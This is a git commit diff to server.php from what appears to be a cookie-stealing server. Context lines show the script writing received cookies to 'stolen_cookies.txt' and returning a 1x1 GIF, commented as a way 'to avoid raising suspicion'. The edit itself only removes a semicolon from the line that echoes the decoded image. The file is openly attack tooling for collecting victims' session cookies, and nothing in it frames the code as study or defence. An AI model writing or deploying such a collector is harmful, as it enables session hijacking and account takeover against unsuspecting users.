cbfd90c59cfe8a2e3fa066f23f5dee256d1db51e
Elon masai <123534505+elonmasai7@users.noreply.github.com>
2025-01-15 21:36:38 +0300

    Update server.php

--- server.php
+++ server.php
@@ -8,4 +8,4 @@ file_put_contents('stolen_cookies.txt', $cookies . "\n");
 
 // Return a 1x1 pixel image to avoid raising suspicion
 header('Content-Type: image/gif');
-echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
+echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
